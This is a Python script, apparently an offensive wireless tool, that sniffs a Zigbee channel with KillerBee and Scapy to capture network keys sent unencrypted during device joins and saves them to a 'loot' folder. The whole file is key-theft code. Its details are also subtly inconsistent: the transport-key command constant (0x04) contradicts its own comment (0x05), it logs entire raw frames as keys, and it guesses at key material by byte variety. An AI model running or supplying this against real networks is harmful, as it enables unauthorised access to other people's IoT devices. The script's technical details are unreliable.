#!/usr/bin/env python3
"""
zigbee-key-extract.py
Description : Monitor Zigbee channel for unencrypted key transport frames
              during device join events. Zigbee 1.x and misconfigured networks
              sometimes transmit network keys in cleartext during the join
              handshake (Trust Center Key Transport).
Requires    : killerbee, scapy
Usage       : python3 zigbee-key-extract.py <channel> [device] [duration_s]
"""

import sys
import time
import os
import binascii
from datetime import datetime

try:
    from killerbee import KillerBee
    from scapy.all import Dot15d4, ZigbeeNWK, ZigbeeSecurityHeader, ZigBeeBeacon
except ImportError:
    print("[!] killerbee and/or scapy not found.")
    print("    Install: pip install killerbee scapy")
    sys.exit(1)

CHANNEL  = int(sys.argv[1]) if len(sys.argv) > 1 else 15
DEVICE   = sys.argv[2] if len(sys.argv) > 2 else None
DURATION = int(sys.argv[3]) if len(sys.argv) > 3 else 300

LOOT_DIR = f"./loot/zigbee-keys-{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(LOOT_DIR, exist_ok=True)
KEYS_FILE = os.path.join(LOOT_DIR, "extracted_keys.txt")

print(f" ==================================================")
print(f"  Zigbee Key Extraction Monitor")
print(f"  Channel: {CHANNEL} | Duration: {DURATION}s")
print(f"  Output: {KEYS_FILE}")
print(f" ==================================================")
print("[*] Watching for device join events and unencrypted key transport...")

TRANSPORT_KEY_CMD = 0x04  # ZigBee APS command frame type for Transport Key

found_keys = []

try:
    kb = KillerBee(device=DEVICE)
    kb.set_channel(CHANNEL)
    start = time.time()

    with open(KEYS_FILE, 'w') as log:
        log.write(f"Timestamp,FrameType,KeyHex,Notes\n")

        while (time.time() - start) < DURATION:
            pkt = kb.pnext(timeout=1)
            if not pkt or not pkt[1]:
                continue

            raw = bytes(pkt[1])
            ts = datetime.now().strftime('%H:%M:%S.%f')[:-3]

            try:
                frame = Dot15d4(raw)
                # Look for APS command frames (Transport Key = 0x05)
                if hasattr(frame, 'aps_frametype') and frame.aps_frametype == 0x01:
                    if hasattr(frame, 'cmd_identifier') and frame.cmd_identifier == TRANSPORT_KEY_CMD:
                        key_hex = binascii.hexlify(raw).decode()
                        found_keys.append(key_hex)
                        print(f"  [{ts}] *** KEY TRANSPORT FRAME DETECTED ***")
                        print(f"    Raw: {key_hex[:64]}...")
                        log.write(f"{ts},APS_TRANSPORT_KEY,{key_hex},UNENCRYPTED_KEY\n")
            except Exception:
                # Check for unencrypted frames with key material patterns (heuristic)
                if len(raw) >= 28 and raw[0] & 0x7 == 1:  # Data frame
                    sec_flag = (raw[0] >> 3) & 1
                    if sec_flag == 0 and len(raw) >= 30:
                        payload = raw[9:]
                        if len(payload) >= 16:
                            key_candidate = payload[:16]
                            # Entropy check: good key has high byte diversity
                            if len(set(key_candidate)) >= 10:
                                key_hex = binascii.hexlify(key_candidate).decode()
                                print(f"  [{ts}] Possible key in plaintext frame: {key_hex}")
                                log.write(f"{ts},HEURISTIC_CANDIDATE,{key_hex},unencrypted_payload\n")

except KeyboardInterrupt:
    pass
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    try:
        kb.close()
    except Exception:
        pass

print(f"\n[+] Monitoring complete.")
print(f"    Key transport events: {len(found_keys)}")
print(f"    Results: {KEYS_FILE}")
